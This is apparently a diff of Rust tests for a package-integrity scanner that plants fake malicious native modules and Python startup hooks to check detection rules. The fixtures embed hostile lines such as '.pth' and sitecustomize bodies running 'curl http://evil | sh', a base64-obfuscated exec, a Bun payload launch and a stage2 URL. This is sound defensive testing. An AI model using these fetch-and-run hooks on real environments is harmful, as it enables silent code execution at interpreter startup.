+        let init_array = 0x1234u64.to_le_bytes().to_vec();
+        // .shstrtab
+        let mut shstrtab: Vec<u8> = vec![0];
+        let name_off = |s: &str, t: &mut Vec<u8>| {
+            let o = t.len() as u32;
+            t.extend_from_slice(s.as_bytes());
+            t.push(0);
+            o
+        };
+        let n_dynsym = name_off(".dynsym", &mut shstrtab);
+        let n_dynstr = name_off(".dynstr", &mut shstrtab);
+        let n_init = name_off(".init_array", &mut shstrtab);
+        let n_rodata = name_off(".rodata", &mut shstrtab);
+        let n_shstr = name_off(".shstrtab", &mut shstrtab);
+        // Layout after 64-byte header.
+        let eh = 64u64;
+        let off_dynsym = eh;
+        let off_dynstr = off_dynsym + dynsym.len() as u64;
+        let off_init = off_dynstr + dynstr.len() as u64;
+        let off_rodata = off_init + init_array.len() as u64;
+        let off_shstr = off_rodata + rodata.len() as u64;
+        let after = off_shstr + shstrtab.len() as u64;
+        let shoff = (after + 7) & !7;
+        // Section headers: NULL, .dynsym(11, link=2, info=1, ent=24), .dynstr(3),
+        // .init_array(14, ent=8), .rodata(1), .shstrtab(3).
+        let secs: [[u64; 8]; 6] = [
+            [0, 0, 0, 0, 0, 0, 0, 0],
+            [
+                n_dynsym as u64,
+                11,
+                off_dynsym,
+                dynsym.len() as u64,
+                2,
+                1,
+                24,
+                0,
+            ],
+            [
+                n_dynstr as u64,
+                3,
+                off_dynstr,
+                dynstr.len() as u64,
+                0,
+                0,
+                0,
+                0,
+            ],
+            [
+                n_init as u64,
+                14,
+                off_init,
+                init_array.len() as u64,
+                0,
+                0,
+                8,
+                0,
+            ],
+            [
+                n_rodata as u64,
+                1,
+                off_rodata,
+                rodata.len() as u64,
+                0,
+                0,
+                0,
+                0,
+            ],
+            [
+                n_shstr as u64,
+                3,
+                off_shstr,
+                shstrtab.len() as u64,
+                0,
+                0,
+                0,
+                0,
+            ],
+        ];
+        let mut buf: Vec<u8> = Vec::new();
+        buf.extend_from_slice(b"\x7fELF");
+        buf.push(2);
+        buf.push(1);
+        buf.push(1);
+        buf.push(0);
+        buf.extend_from_slice(&[0u8; 8]);
+        buf.extend_from_slice(&3u16.to_le_bytes()); // ET_DYN
+        buf.extend_from_slice(&0x3eu16.to_le_bytes()); // x86-64
+        buf.extend_from_slice(&1u32.to_le_bytes());
+        buf.extend_from_slice(&0u64.to_le_bytes()); // entry
+        buf.extend_from_slice(&0u64.to_le_bytes()); // phoff
+        buf.extend_from_slice(&shoff.to_le_bytes());
+        buf.extend_from_slice(&0u32.to_le_bytes()); // flags
+        buf.extend_from_slice(&(eh as u16).to_le_bytes());
+        buf.extend_from_slice(&0u16.to_le_bytes());
+        buf.extend_from_slice(&0u16.to_le_bytes());
+        buf.extend_from_slice(&64u16.to_le_bytes()); // shentsize
+        buf.extend_from_slice(&6u16.to_le_bytes()); // shnum
+        buf.extend_from_slice(&5u16.to_le_bytes()); // shstrndx
+        buf.extend_from_slice(&dynsym);
+        buf.extend_from_slice(&dynstr);
+        buf.extend_from_slice(&init_array);
+        buf.extend_from_slice(rodata);
+        buf.extend_from_slice(&shstrtab);
+        while (buf.len() as u64) < shoff {
+            buf.push(0);
+        }
+        for s in &secs {
+            buf.extend_from_slice(&(s[0] as u32).to_le_bytes()); // name
+            buf.extend_from_slice(&(s[1] as u32).to_le_bytes()); // type
+            buf.extend_from_slice(&0u64.to_le_bytes()); // flags
+            buf.extend_from_slice(&0u64.to_le_bytes()); // addr
+            buf.extend_from_slice(&s[2].to_le_bytes()); // offset
+            buf.extend_from_slice(&s[3].to_le_bytes()); // size
+            buf.extend_from_slice(&(s[4] as u32).to_le_bytes()); // link
+            buf.extend_from_slice(&(s[5] as u32).to_le_bytes()); // info
+            buf.extend_from_slice(&8u64.to_le_bytes()); // addralign
+            buf.extend_from_slice(&s[6].to_le_bytes()); // entsize
+        }
+        buf
+    }
+
+    #[test]
+    fn native_import_execution_chain_fires_on_installed_so() {
+        // B7 LIVE PATH: `ecosystem scan --installed` over a site-packages tree
+        // containing a malicious native module produces NativeImportExecutionChain.
+        let dir = tempfile::tempdir().unwrap();
+        // A malicious .so: PyInit export (execution entry) + .init_array
+        // constructor, and a single co-located command string that LAUNCHES a
+        // runtime against a sibling payload (the danger + corroboration legs, the
+        // campaign's actual pattern).
+        let so = build_min_elf_so("PyInit_evil", b"system(\"node ./loader/_bootstrap.js\")\0");
+        plant_installed_dist(
+            dir.path(),
+            "evilpkg",
+            "1.0.0",
+            &[
+                ("evilpkg/__init__.py", b"from . import _ext\n"),
+                ("evilpkg/_ext.cpython-311-x86_64-linux-gnu.so", &so),
+            ],
+            true,
+            &[],
+        );
+
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(
+            integrity.native_modules_triaged >= 1,
+            "the installed .so must be triaged"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::NativeImportExecutionChain),
+            "a malicious native module must fire NativeImportExecutionChain; got {rules:?}"
+        );
+        // Critical -> Block.
+        let finding = report
+            .verdict
+            .findings
+            .iter()
+            .find(|f| f.rule_id == RuleId::NativeImportExecutionChain)
+            .unwrap();
+        assert_eq!(finding.severity, Severity::Critical);
+        assert_eq!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn native_benign_so_no_chain_on_installed() {
+        // A NumPy-shaped .so (PyInit + constructor, only numerical strings) LISTED
+        // in RECORD must NOT fire the chain on the live installed path.
+        let dir = tempfile::tempdir().unwrap();
+        let so = build_min_elf_so(
+            "PyInit__multiarray",
+            b"cblas_dgemm\0numpy.linalg\0_ARRAY_API\0",
+        );
+        plant_installed_dist(
+            dir.path(),
+            "numpyish",
+            "1.26.0",
+            &[
+                ("numpyish/__init__.py", b"from . import _core\n"),
+                ("numpyish/_core.cpython-311-x86_64-linux-gnu.so", &so),
+            ],
+            true,
+            &[],
+        );
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::NativeImportExecutionChain),
+            "a benign numerical .so must produce no native chain; got {rules:?}"
+        );
+        assert_ne!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn native_unowned_so_corroborates_chain_on_installed() {
+        // An UNOWNED native module (not listed in any RECORD) with an execution
+        // entry + a danger capability fires the chain even WITHOUT a runtime/sibling
+        // string, because being unowned is itself the corroborator.
+        let dir = tempfile::tempdir().unwrap();
+        // Plant a benign dist first (so a site-packages exists with an ownership
+        // index), then drop an unowned .so beside it.
+        let site = plant_installed_dist(
+            dir.path(),
+            "host",
+            "1.0",
+            &[("host/__init__.py", b"x = 1\n")],
+            true,
+            &[],
+        );
+        // The unowned .so: PyInit + constructor + a SUSPICIOUS URL (the danger leg),
+        // but NO co-located runtime launch and NO sensitive path (so string
+        // corroboration is absent). The chain fires only because being UNOWNED is
+        // itself the corroborator.
+        let so = build_min_elf_so("PyInit_orphan", b"https://198.51.100.7:4444/stage2\0");
+        let orphan_dir = site.join("orphan");
+        std::fs::create_dir_all(&orphan_dir).unwrap();
+        std::fs::write(orphan_dir.join("_payload.so"), &so).unwrap();
+
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::NativeImportExecutionChain),
+            "an unowned native module with entry+danger must fire (unowned corroborates); got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn oversized_native_module_emits_partial_coverage_signal() {
+        // A native module larger than the native-parse cap (64 MiB) cannot be
+        // triaged on the installed walk (which does not stream above-cap members).
+        // Before the fix it was skipped silently with no gap/signal. It must now
+        // emit an HONEST Low-confidence `NativeUninspectable` partial-coverage
+        // signal (NOT a NativeExecutionEntry, which would claim execution we never
+        // observed), and it must NOT be counted as triaged.
+        let dir = tempfile::tempdir().unwrap();
+        let site = plant_installed_dist(
+            dir.path(),
+            "host",
+            "1.0",
+            &[("host/__init__.py", b"x = 1\n")],
+            true,
+            &[],
+        );
+        // One synthetic .so strictly over the cap (ELF magic so it is plausibly a
+        // module, though it is never parsed because the read is refused for size).
+        let oversized = (MAX_NATIVE_MODULE_BYTES + 1) as usize;
+        let mut body = vec![0u8; oversized];
+        body[..4].copy_from_slice(b"\x7fELF");
+        std::fs::write(site.join("host").join("_big.so"), &body).unwrap();
+
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(
+            integrity.native_signals.iter().any(|s| matches!(
+                s.kind,
+                crate::artifact::ArtifactSignalKind::NativeUninspectable
+            )),
+            "an oversized native module must emit the uninspectable partial-coverage signal; got {:?}",
+            integrity
+                .native_signals
+                .iter()
+                .map(|s| s.kind)
+                .collect::<Vec<_>>()
+        );
+        // The oversized module must NOT count as triaged (it was not).
+        assert_eq!(
+            integrity.native_modules_triaged, 0,
+            "an uninspected oversized module must not be counted as triaged"
+        );
+        // And it must NOT fabricate an execution entry (the dishonest representation
+        // the finding warns against).
+        assert!(
+            !integrity.native_signals.iter().any(|s| matches!(
+                s.kind,
+                crate::artifact::ArtifactSignalKind::NativeExecutionEntry
+            )),
+            "an uninspected module must not claim a native execution entry"
+        );
+    }
+
+    #[test]
+    #[allow(non_snake_case)] // `N` reads as the version-component placeholder
+    fn versioned_so_N_is_native_module() {
+        // T3.22: a versioned ELF shared object (`libcrypto.so.3`, `libfoo.so.1.2.3`)
+        // is a native module, not just the bare `.so`/`.dylib`/`.pyd`/`.node`.
+        assert!(is_native_module_path(Path::new("/x/libcrypto.so.3")));
+        assert!(is_native_module_path(Path::new("/x/libfoo.so.1.2.3")));
+        assert!(is_native_module_path(Path::new("/x/_core.so")));
+        assert!(is_native_module_path(Path::new("/x/_core.dylib")));
+        assert!(is_native_module_path(Path::new("/x/_core.pyd")));
+        assert!(is_native_module_path(Path::new("/x/addon.node")));
+        // Negatives: a non-numeric suffix or an unrelated extension is not a module.
+        assert!(!is_native_module_path(Path::new("/x/notes.sober")));
+        assert!(!is_native_module_path(Path::new("/x/lib.so.dev")));
+        assert!(!is_native_module_path(Path::new("/x/readme.txt")));
+    }
+
+    #[test]
+    fn integrity_benign_editable_install_no_block() {
+        // An editable install: a sparse RECORD (listing only the dist-info and a
+        // .pth-style pointer) and absent project files must not block.
+        let dir = tempfile::tempdir().unwrap();
+        let site = dir.path().join("site-packages");
+        let dist_info = site.join("proj-0.1.0.dist-info");
+        std::fs::create_dir_all(&dist_info).unwrap();
+        std::fs::write(
+            dist_info.join("METADATA"),
+            "Metadata-Version: 2.1\nName: proj\nVersion: 0.1.0\n",
+        )
+        .unwrap();
+        // direct_url.json marks it editable.
+        std::fs::write(
+            dist_info.join("direct_url.json"),
+            br#"{"url":"file:///home/me/proj","dir_info":{"editable":true}}"#,
+        )
+        .unwrap();
+        // RECORD references a project file that is NOT on disk (editable installs
+        // legitimately point outside site-packages) plus RECORD itself.
+        std::fs::write(
+            dist_info.join("RECORD"),
+            "proj/__init__.py,sha256=AAAA,10\nproj-0.1.0.dist-info/RECORD,,\n",
+        )
+        .unwrap();
+
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(integrity.distributions_checked >= 1);
+        assert_ne!(
+            report.verdict.action,
+            Action::Block,
+            "an editable install must not block on a sparse/absent-file RECORD"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "an editable install must not fire the integrity violation; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn integrity_benign_distro_managed_no_block() {
+        // A distro/conda-style install: an INSTALLER naming a non-pip installer,
+        // and unverifiable (empty-hash) RECORD rows. Divergence is legitimate; no
+        // block.
+        let dir = tempfile::tempdir().unwrap();
+        plant_installed_dist(
+            dir.path(),
+            "distropkg",
+            "3.0",
+            &[("distropkg/__init__.py", b"# distro\n")],
+            true,
+            &[("INSTALLER", b"conda\n")],
+        );
+        let report = scan(&installed_request(dir.path()));
+        assert_ne!(
+            report.verdict.action,
+            Action::Block,
+            "a distro/conda-managed install must not block"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(!rules.contains(&RuleId::PythonInstalledIntegrityViolation));
+    }
+
+    #[test]
+    fn integrity_absent_in_manifests_mode() {
+        // The integrity report is only computed in `--installed` mode, so a
+        // manifest-mode scan must leave it None (byte-identical JSON invariant).
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"dependencies":{"left-pad":"1.0.0"}}"#,
+        )
+        .unwrap();
+        let mut req = installed_request(dir.path());
+        req.mode = ScanMode::Manifests;
+        let report = scan(&req);
+        assert!(
+            report.integrity.is_none(),
+            "manifest-mode scan must not compute an integrity report"
+        );
+    }
+
+    // ---- B6: Python startup-hook EXECUTION (end-to-end via scan) ---------------
+
+    /// Plant a bare `site-packages` root with one named startup-hook file at its
+    /// top level (a `.pth`/`.start`/`sitecustomize.py`), plus a single owned dist
+    /// so the tree is a realistic install. Returns the root (pass to
+    /// `installed_request`).
+    fn plant_startup_hook(root: &Path, hook_name: &str, body: &[u8]) -> PathBuf {
+        // A minimal owned distribution so the root looks like a real env.
+        let site = plant_installed_dist(
+            root,
+            "base",
+            "1.0",
+            &[("base/__init__.py", b"x = 1\n")],
+            true,
+            &[],
+        );
+        std::fs::write(site.join(hook_name), body).unwrap();
+        root.to_path_buf()
+    }
+
+    #[test]
+    fn startup_pth_os_system_fires_suspicious() {
+        let dir = tempfile::tempdir().unwrap();
+        // A `.pth` whose import line runs a shell at interpreter start.
+        plant_startup_hook(
+            dir.path(),
+            "evil.pth",
+            b"import os; os.system('curl http://evil/x | sh')\n",
+        );
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(
+            !integrity.startup_signals.is_empty(),
+            "the executing .pth must record startup signals"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "an os.system .pth must fire the suspicious finding; got {rules:?}"
+        );
+        // High -> Block.
+        assert_eq!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_pth_cross_runtime_fires_critical() {
+        let dir = tempfile::tempdir().unwrap();
+        // A `.pth` that launches Bun against a sibling JS payload (the campaign's
+        // cross-distribution split). Renaming the script must not evade, so the
+        // rule keys on `bun`, not the filename.
+        plant_startup_hook(
+            dir.path(),
+            "loader.pth",
+            b"import subprocess; subprocess.Popen(['bun', 'run', 'payload/anything.js'])\n",
+        );
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(
+            integrity.startup_cross_runtime,
+            "a Bun launch must set the cross-runtime flag"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookCrossRuntime),
+            "a Bun-launching .pth must fire the cross-runtime finding; got {rules:?}"
+        );
+        let finding = report
+            .verdict
+            .findings
+            .iter()
+            .find(|f| f.rule_id == RuleId::PythonStartupHookCrossRuntime)
+            .unwrap();
+        assert_eq!(finding.severity, Severity::Critical);
+        assert_eq!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_pth_base64_obfuscated_fires_suspicious() {
+        use base64::Engine as _;
+        let dir = tempfile::tempdir().unwrap();
+        let inner = "os.system('id')";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(inner);
+        let body = format!("import base64; exec(base64.b64decode('{encoded}'))\n");
+        plant_startup_hook(dir.path(), "hidden.pth", body.as_bytes());
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "a base64-obfuscated exec .pth must fire suspicious; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn startup_pth_tmp_path_addition_alone_does_not_block() {
+        let dir = tempfile::tempdir().unwrap();
+        // A NON-executing path-add line pointing at /tmp: a signal, but on its own
+        // (no executing line) it does not promote to a Block.
+        plant_startup_hook(dir.path(), "paths.pth", b"/tmp/attacker\n");
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        // The untrusted-path signal is recorded.
+        assert!(
+            integrity.startup_signals.iter().any(|s| matches!(
+                s.kind,
+                crate::artifact::ArtifactSignalKind::PthUntrustedPathAddition
+            )),
+            "the /tmp path-add must record an untrusted-path signal"
+        );
+        // But with no executing line, no suspicious finding and no Block.
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "a bare path-add must not promote to the suspicious finding; got {rules:?}"
+        );
+        assert_ne!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_benign_namespace_pth_stays_clean() {
+        let dir = tempfile::tempdir().unwrap();
+        // A canonical setuptools namespace bootstrap: it begins with `import` and
+        // executes, but is a recognized benign template -> no startup finding.
+        let body =
+            b"import sys, types, os; m = sys.modules.setdefault('ns', types.ModuleType('ns'))\n";
+        plant_startup_hook(dir.path(), "ns-nspkg.pth", body);
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonStartupHookSuspicious)
+                && !rules.contains(&RuleId::PythonStartupHookCrossRuntime),
+            "a benign namespace .pth must produce no startup finding; got {rules:?}"
+        );
+        assert_ne!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_benign_editable_pth_stays_clean() {
+        let dir = tempfile::tempdir().unwrap();
+        // A setuptools editable finder bootstrap: a known template -> clean.
+        let body = b"import __editable___base_1_0_finder; __editable___base_1_0_finder.install()\n";
+        plant_startup_hook(dir.path(), "__editable__.base-1.0.pth", body);
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "a benign editable .pth must produce no startup finding; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn startup_tampered_editable_pth_fires() {
+        let dir = tempfile::tempdir().unwrap();
+        // The editable template PLUS an appended malicious call: the complete line
+        // no longer matches the template, so it is analyzed and fires.
+        let body = b"import __editable___base_1_0_finder; __editable___base_1_0_finder.install(); __import__('os').system('curl http://evil | sh')\n";
+        plant_startup_hook(dir.path(), "__editable__.base-1.0.pth", body);
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "a tampered editable template must fire suspicious; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn startup_sitecustomize_body_fires_and_unowned_corroborates() {
+        let dir = tempfile::tempdir().unwrap();
+        // An unowned sitecustomize.py whose MODULE body spawns a shell: B5's
+        // unowned-hook integrity violation AND B6's startup-suspicious both fire.
+        plant_startup_hook(
+            dir.path(),
+            "sitecustomize.py",
+            b"import os\nos.system('curl http://evil | sh')\n",
+        );
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "an executing sitecustomize body must fire suspicious; got {rules:?}"
+        );
+        assert!(
+            rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "the unowned sitecustomize must also fire the B5 integrity violation"
+        );
+        assert_eq!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_clean_env_no_startup_findings() {
+        // A realistic clean env with an editable `.pth` pointer and a numpy-shaped
+        // dist must produce NO startup finding (negative control).
+        let dir = tempfile::tempdir().unwrap();
+        let site = plant_installed_dist(
+            dir.path(),
+            "numpyish",
+            "1.26.0",
+            &[
+                ("numpyish/__init__.py", b"from . import _core\n"),
+                (
+                    "numpyish/_core.cpython-311-x86_64-linux-gnu.so",
+                    b"\x7fELF fake\n",
+                ),
+            ],
+            true,
+            &[],
+        );
+        // A plain editable `.pth` that only adds a project directory (path-add).
+        std::fs::write(site.join("project.pth"), b"/home/me/project/src\n").unwrap();
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonStartupHookSuspicious)
+                && !rules.contains(&RuleId::PythonStartupHookCrossRuntime),
+            "a clean env must produce no startup finding; got {rules:?}"
+        );
+        assert_ne!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn sitecustomize_with_only_sys_path_insert_is_clean() {
+        // A legitimate sitecustomize whose ONLY action is a sys.path insert. It
+        // executes (module body) and records a `PthSysPathSearch` signal, but
+        // sys.path manipulation alone is NOT a danger leg (T3.16/T2.11), so it must
+        // NOT fire the suspicious finding. (The unowned-hook B5 integrity violation
+        // may still fire; that is a separate, expected signal.)
+        let dir = tempfile::tempdir().unwrap();
+        plant_startup_hook(
+            dir.path(),
+            "sitecustomize.py",
+            b"import sys; sys.path.insert(0, \"/opt/app/plugins\")\n",
+        );
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        // The sys.path search IS recorded as evidence.
+        assert!(
+            integrity.startup_signals.iter().any(|s| matches!(
+                s.kind,
+                crate::artifact::ArtifactSignalKind::PthSysPathSearch
+            )),
+            "the sys.path.insert must still record a PthSysPathSearch signal"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "sys.path manipulation alone must not fire the suspicious finding; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn startup_correlation_uses_single_danger_definition() {
+        use crate::artifact::{ArtifactSignal, ArtifactSignalKind as K, EdgeConfidence};
+        use crate::location::SubjectLocation;
+
+        let loc = SubjectLocation::installed("/venv/lib/site-packages/x.pth");
+        let sig = |kind: K| ArtifactSignal {
+            kind,
+            location: loc.clone(),
+            evidence: "test".to_string(),
+            confidence: EdgeConfidence::High,
+        };
+
+        // An executing line PLUS only sys.path-search / untrusted-path signals: the
+        // correlation must agree with `BodyCapabilities::has_danger()` (which counts
+        // neither as danger), so NO suspicious finding.
+        let report = InstalledIntegrityReport {
+            startup_signals: vec![
+                sig(K::PthExecutableLine),
+                sig(K::PthSysPathSearch),
+                sig(K::PthUntrustedPathAddition),
+            ],
+            ..Default::default()
+        };
+        let no_danger_caps = crate::artifact::pth::BodyCapabilities {
+            sys_path_search: true,
+            ..Default::default()
+        };
+        assert!(
+            !no_danger_caps.has_danger(),
+            "sys.path search alone is not danger in the single definition"
+        );
+        let findings = report.startup_correlated_findings();
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::PythonStartupHookSuspicious),
+            "the correlation must agree with has_danger(): sys.path/untrusted-path \
+             alone is not danger; got {:?}",
+            findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
+        );
+
+        // An executing line PLUS a real subprocess capability: both the single
+        // definition and the correlation must treat this as danger -> suspicious.
+        let report = InstalledIntegrityReport {
+            startup_signals: vec![sig(K::PthExecutableLine), sig(K::PthSubprocessSpawn)],
+            ..Default::default()
+        };
+        let danger_caps = crate::artifact::pth::BodyCapabilities {
+            subprocess: true,
+            ..Default::default()
+        };
+        assert!(danger_caps.has_danger(), "a subprocess spawn is danger");
+        let findings = report.startup_correlated_findings();
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::PythonStartupHookSuspicious),
+            "an executing line + subprocess capability must still fire suspicious; got {:?}",
+            findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
+        );
+    }
+
+    /// native_findings is #[serde(skip)] (folded into the verdict via
+    /// native_correlated_findings, not the JSON report), so it must not appear in the
+    /// serialized report yet must still be returned for the verdict.
+    #[test]
+    fn native_findings_skipped_in_json_but_folded_into_verdict() {
+        use crate::verdict::{Evidence, Finding, Severity};
+        let finding = Finding {
+            rule_id: RuleId::NativeImportExecutionChain,
+            severity: Severity::Critical,
+            title: "native import-execution chain".to_string(),
+            description: "test".to_string(),
+            evidence: vec![Evidence::Text {
+                detail: "test".to_string(),
+            }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        };
+        let report = InstalledIntegrityReport {
+            native_findings: vec![finding],
+            ..Default::default()
+        };
+        let json = serde_json::to_string(&report).unwrap();
+        assert!(
+            !json.contains("native_findings"),
+            "native_findings is #[serde(skip)] and must not appear in the JSON report: {json}"
+        );
+        let folded = report.native_correlated_findings();
+        assert_eq!(
+            folded.len(),
+            1,
+            "native_findings must still be folded into the verdict"
+        );
+        assert_eq!(folded[0].rule_id, RuleId::NativeImportExecutionChain);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn unreadable_startup_hook_emits_signal() {
+        use std::os::unix::fs::symlink;
+
+        // A `.pth` planted as a SYMLINK at the final component. The no-follow read
+        // (O_NOFOLLOW) refuses it as a non-regular file, so the body cannot be
+        // inspected. It must NOT be treated as clean: a Low-confidence
+        // `StartupHookUninspectable` signal must be recorded (T3.18). Before the
+        // fix the read error returned silently with no signal.
+        let dir = tempfile::tempdir().unwrap();
+        let site = plant_installed_dist(
+            dir.path(),
+            "base",
+            "1.0",
+            &[("base/__init__.py", b"x = 1\n")],
+            true,
+            &[],
+        );
+        // Symlink target need not exist: O_NOFOLLOW refuses the link itself.
+        symlink("/nonexistent/payload.txt", site.join("planted.pth")).unwrap();
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(
+            integrity.startup_signals.iter().any(|s| matches!(
+                s.kind,
+                crate::artifact::ArtifactSignalKind::StartupHookUninspectable
+            )),
+            "a symlinked (unreadable) startup hook must emit the uninspectable signal; got {:?}",
+            integrity
+                .startup_signals
+                .iter()
+                .map(|s| s.kind)
+                .collect::<Vec<_>>()
         );
     }
 }
